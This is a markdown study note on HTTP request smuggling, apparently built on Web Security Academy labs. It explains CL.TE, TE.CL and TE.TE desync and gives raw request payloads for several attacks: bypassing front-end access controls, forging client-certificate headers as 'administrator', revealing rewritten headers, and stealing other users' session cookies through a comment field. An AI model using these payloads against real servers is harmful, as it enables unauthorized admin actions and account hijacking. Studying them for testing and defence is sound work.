# HTTP request smuggling

HTTP request smuggling is a server-side attack that takes advantage of discrepancies in how web servers and proxies interpret HTTP requests, potentially leading to request manipulation, security bypasses, or the exposure of sensitive data.

### Table of Content

- **[Explanation](#explanation)**
    - [How do HTTP request smuggling vulnerabilities arise?](#how-do-http-request-smuggling-vulnerabilities-arise)
- **[Perform the attack](#perfom-the-attack)**
    - [prepare smuggling](#prepare)
    - [Detect type of smuggling](#detect-type-of-smuggling)
    - [CL.TE vulnerabilities](#clte-vulnerabilities)
    - [TE.TE: obfuscating the TE header](#tete-obfuscating-the-te-header)
- **[Exploit](#exploit)**
    - [Using HTTP request smuggling to bypass front-end security controls](#using-http-request-smuggling-to-bypass-front-end-security-controls)
    - [Revealing front-end request rewriting](#revealing-front-end-request-rewriting)
    - [Bypassing client authentication](#bypassing-client-authentication)
    - [Capturing other users' requests](#capturing-other-users-requests)

## Explanation

Today's web applications frequently employ chains of HTTP servers between users and the ultimate application logic. Users send requests to a front-end server (sometimes called a load balancer or reverse proxy) and this server forwards requests to one or more back-end servers. This type of architecture is increasingly common, and in some cases unavoidable, in modern cloud-based applications.

When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection, because this is much more efficient and performant. The protocol is very simple; HTTP requests are sent one after another, and the receiving server has to determine where one request ends and the next one begins.

An attacker can simulate the end of it request to be interpreted by the back-end server as the start of the next request. At this point, he can inject some code in the next request.

![illustration of smuggling attack](/web/img/smuggling-http-request-to-back-end-server.svg)

### How do HTTP request smuggling vulnerabilities arise?

Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.

The Content-Length header is straightforward: it specifies the length of the message body in bytes. For example:

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

If both the Content-Length and Transfer-Encoding headers are present, then the Content-Length header should be ignored. This might be sufficient to avoid ambiguity when only a single server is in play, but not when two or more servers are chained together. In this situation, problems can arise for two reasons:

- Some servers do not support the Transfer-Encoding header in requests.
- Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.

If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) Transfer-Encoding header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities.

*Websites that use HTTP/2 end-to-end are inherently immune to request smuggling attacks. As the HTTP/2 specification introduces a single, robust mechanism for specifying the length of a request, there is no way for an attacker to introduce the required ambiguity.However, many websites have an HTTP/2-speaking front-end server, but deploy this in front of back-end infrastructure that only supports HTTP/1. This means that the front-end effectively has to translate the requests it receives into HTTP/1. This process is known as HTTP downgrading.*

## Perfom the attack

Classic request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:

- CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
- TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
- TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

### Prepare

![prepare](/web/img/prepare-smuggling.png)

### Detect type of smuggling

![detect](/web/img/detect-smugglin.png)

```
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X
```

```
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

### CL.TE vulnerabilities

The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.

We can perform a simple HTTP request smuggling attack as follows:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

Content-Length = 6  = 0\r\n + \r\n + x

The front-end server processes the Content-Length header and determines that the request body is 6 bytes long, up to the end of X. This request is forwarded on to the back-end server.

The back-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The following bytes, X, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.

So if you send this twice, next request will be handle as `XPOST /HTTP/1.1`.

### TE.CL vulnerabilities

Here, the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. We can perform a simple HTTP request smuggling attack as follows:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

### TE.TE: obfuscating the TE header

TE.TE vulnerability, it is necessary to find some variation of the Transfer-Encoding header such that only one of the front-end or back-end servers processes it, while the other server ignores it.

There are potentially endless ways to obfuscate the Transfer-Encoding header. For example:

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

## Exploit

### Using HTTP request smuggling to bypass front-end security controls

In some applications, the front-end web server is used to implement some security controls, deciding whether to allow individual requests to be processed. Allowed requests are forwarded to the back-end server, where they are deemed to have passed through the front-end controls.

Suppose the current user is permitted to access /home but not /admin. They can bypass this restriction using the following request smuggling attack:

#### CL.TE

request send:

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

x=
```

Poisoned request: 

```
GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

x=GET /home HTTP/1.1
Host: vulnerable-website.com
```

#### TE.CL

Request send:

```
POST / HTTP/1.1
Host: 0a400088045445ac81ac2f150045003b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

x =
0

```

Poisonous request: 

```
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

x =POST / HTTP/1.1
Host: 0a400088045445ac81ac2f150045003b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
...
```

### Revealing front-end request rewriting

In many applications, the front-end server performs some rewriting of requests before they are forwarded to the back-end server, typically by adding some additional request headers. For example, the front-end server might:

- terminate the TLS connection and add some headers describing the protocol and ciphers that were used;
- add an X-Forwarded-For header containing the user's IP address;
- determine the user's ID based on their session token and add a header identifying the user; or
- add some sensitive information that is of interest for other attacks.

In some situations, if your smuggled requests are missing some headers that are normally added by the front-end server, then the back-end server might not process the requests in the normal way, resulting in smuggled requests failing to have the intended effects.

There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:

- Find a POST request that reflects the value of a request parameter into the application's response.
- Shuffle the parameters so that the reflected parameter appears last in the message body.
- Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.

Suppose an application has a login function that reflects the value of the email parameter:

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
This results in a response containing the following:

```html
<input id="email" value="wiener@normal-user.net" type="text">
```

Here you can use the following request smuggling attack to reveal the rewriting that is performed by the front-end server:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...
```

the back-end server will process the smuggled request and treat the rewritten second request as being the value of the email parameter:

```html
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external" >
```

:warning: *Since the final request is being rewritten, you don't know how long it will end up. The value in the Content-Length header in the smuggled request will determine how long the back-end server believes the request is. If you set this value too short, you will receive only part of the rewritten request; if you set it too long, the back-end server will time out waiting for the request to complete.*

### Bypassing client authentication

As part of the TLS handshake, servers authenticate themselves with the client (usually a browser) by providing a certificate. This certificate contains their "common name" (CN), which should match their registered hostname. The client can then use this to verify that they're talking to a legitimate server belonging to the expected domain.

Some sites go one step further and implement a form of mutual TLS authentication, where clients must also present a certificate to the server. In this case, the client's CN is often a username or suchlike, which can be used in the back-end application logic as part of an access control mechanism.

```
GET /admin HTTP/1.1
Host: normal-website.com
X-SSL-CLIENT-CN: carlos
```

As these headers are supposed to be completely hidden from users, they are often implicitly trusted by back-end servers.

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

x =
```

### Capturing other users' requests

If the application contains any kind of functionality that allows you to store and later retrieve textual data, you can potentially use this to capture the contents of other users' requests. These may include session tokens or other sensitive data submitted by the user. Suitable functions to use as the vehicle for this attack would be comments, emails, profile descriptions, screen names, and so on.

to exploit this vulnerability, it is the same idea as [Revealing front-end request rewriting](#revealing-front-end-request-rewriting) by writing somewhere in the code the next request send by a user to steal sensitive informations such as cookies: CL.TE example:

request: 

```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

poisonous request by a user:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
... 
```


---

[**:arrow_right_hook: Back home**](/README.md)